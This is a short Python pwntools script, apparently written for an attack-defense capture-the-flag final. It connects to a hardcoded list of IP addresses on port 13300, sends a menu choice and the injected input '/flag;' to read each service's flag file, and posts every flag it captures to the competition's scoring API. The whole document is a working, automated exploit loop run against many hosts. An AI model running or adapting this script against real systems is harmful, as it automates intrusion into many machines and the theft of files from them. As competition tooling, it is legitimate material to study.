#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: ByamB4

from pwn import *
from requests import post


TARGETS = ['16.162.121.56', '18.162.113.173', '18.167.20.149', '18.166.29.174', '18.163.191.225', '18.163.124.161', '18.162.229.52', '18.162.213.160',
           '18.166.225.82', '16.162.121.56', '18.162.213.70', '18.163.191.225', '18.166.29.174', '18.167.20.149', '18.162.52.48', '18.162.113.173']
HEADERS = {
    'Authorization': "<YOURAUTHTOKEN>"
}

for host in TARGETS:
    port = int(args.PORT or 13300)
    try:

        def start(argv=[], *a, **kw):
            io = connect(host, port)
            return io

        io = start()
        io.recv()
        io.sendline(b'2')
        io.recv()
        io.sendline(b"/flag;")
        io.recv()
        io.sendline(b'something')
        io.recv()
        flag = io.recv().split()[0].decode()
        resp = post('http://final.haruulzangi.mn:19999/api/flag', json={
            'flag': flag}, headers=HEADERS)
        print(f'[*] Response: {resp.text}')
    except Exception as e:
        print(f'[-] Error: {e}')
